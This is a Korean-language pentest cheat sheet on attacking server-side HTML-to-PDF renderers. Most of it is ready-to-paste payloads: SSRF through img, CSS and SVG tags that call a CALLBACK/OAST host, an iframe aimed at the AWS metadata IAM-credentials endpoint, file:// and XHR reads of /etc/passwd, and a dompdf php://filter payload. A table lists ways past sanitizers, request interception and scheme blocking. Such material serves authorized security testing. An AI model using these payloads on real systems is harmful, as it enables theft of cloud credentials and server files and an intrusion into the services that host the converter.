### 기본 페이로드

#### JS 실행 (puppeteer/headless Chrome)
- `<script>document.write("JS_EXECUTED_"+Date.now())</script>` (PDF에 결과 캡처되면 확인)
- `<div id=x></div><script>fetch("http://127.0.0.1:8080/").then(r=>r.text()).then(t=>document.getElementById("x").innerText=t)</script>` (내부 fetch → DOM → PDF)

**SSRF** (`SSRF` 라벨):
- `<img src="https://CALLBACK.oast.fun/ssrf-pdf">` (외부 fetch)
- `<link rel="stylesheet" href="https://CALLBACK/css">`
- `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width=800 height=500></iframe>` (AWS metadata)
- `<style>@import url(https://CALLBACK/css-import);</style>` (CSS import)
- `<svg><image href="https://CALLBACK/svg"/></svg>` (SVG inline)
- `<svg><filter id="x"><feImage href="https://CALLBACK/svg-filter"/></filter></svg>` (SVG filter)

**LFI** (`LFI` 라벨):
- `<iframe src="file:///etc/hostname" width=800 height=500></iframe>` (file:// 스킴)
- `<div id=x></div><script>x=new XMLHttpRequest();x.onload=()=>document.getElementById("x").innerText=this.responseText;x.open("GET","file:///etc/passwd");x.send()</script>` (XHR + file://)
- `<img src="file:///etc/passwd" width=600 height=800>` (wkhtmltopdf/weasyprint)
- `<annotation file="/etc/hostname" content="/etc/hostname" icon="Graph" title="x"/>` (pd4ml 등)
- `<embed src="file:///etc/passwd" type="text/plain">`

#### RCE (dompdf 구버전, CVE-2022-28368)
- `<style>@font-face{font-family:x;src:url("php://filter/resource=/etc/passwd");}</style>`

#### ImageMagick RCE (이미지 변환 결합)
- MVG/SVG 입력 (`fill 'url(https://CALLBACK/imgtragick)'`)

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| HTML sanitize (DOMPurify) | CSS 미점검 시 `@import url(file://)`, SVG `<image href="file://">` |
| wkhtmltopdf `--disable-local-file-access` | 외부 HTTP fetch 여전 — `--disable-javascript` + 네트워크 격리 필요 |
| puppeteer `setRequestInterception(true)` | `data:` URL, redirect chain, SW intercept 우회 |
| 네트워크 egress 차단 | 허용된 내부 리소스 (prometheus, grafana, 내부 API)는 allowlist면 접근 |
| `file://` 스킴만 차단 | `php://filter`, `gopher://`, `dict://`, `jar://`, `netdoc://` 누락 |
| puppeteer sandbox 활성화 | `--no-sandbox` 잔존 시 컨테이너 탈출 위험 (영향도 격상) |
| Markdown sanitize | marked `html: true` 옵션이면 `<script>` 직접 삽입 가능 |

---

### 참고사항

- HTML→PDF 변환기가 sink — 직접 PDF 생성 라이브러리(pdfkit/reportlab)는 안전
- wkhtmltopdf, puppeteer, WeasyPrint가 가장 흔한 엔진
- dompdf는 사용자 입력 → RCE 사례 다수 (CVE-2022-28368 등) — 버전 확인 필수
- puppeteer `--no-sandbox` 운영 환경은 컨테이너 탈출 게이트
- CSP는 서버 puppeteer에 적용 안 됨 — 브라우저 CSP 무의미
- 결과 PDF가 다른 사용자에게 발송되면 stored exfiltration 영향도
- Markdown → HTML → PDF 체인도 동일 위험 (marked `html: true` 옵션)
- 격리 컨테이너 + 네트워크 egress 차단이 유일한 확실한 방어
- XSS → PDF 서버 렌더 체인은 blind SSRF/LFI 게이트로 자주 활용
- AWS metadata가 가장 큰 영향 (IAM credential → 계정 takeover) — ssrf-scanner 결합
- PDF annotation `/JavaScript` action은 PDF 뷰어에서 실행 — Adobe Reader 등
- SVG `<filter>`/`<feImage>`는 sanitize 우회 + 외부 fetch 게이트
- `<embed>`/`<object>`/`<iframe>` 모두 file:// 스킴 sink — 차단 누락 시 LFI
- 영수증/인보이스 자동 생성은 사용자 입력(이름/주소/메모)이 sink로 가장 흔함
- PDF에 결과 캡처가 안 보이면 OAST 콜백으로 SSRF만 확인 (Blind)
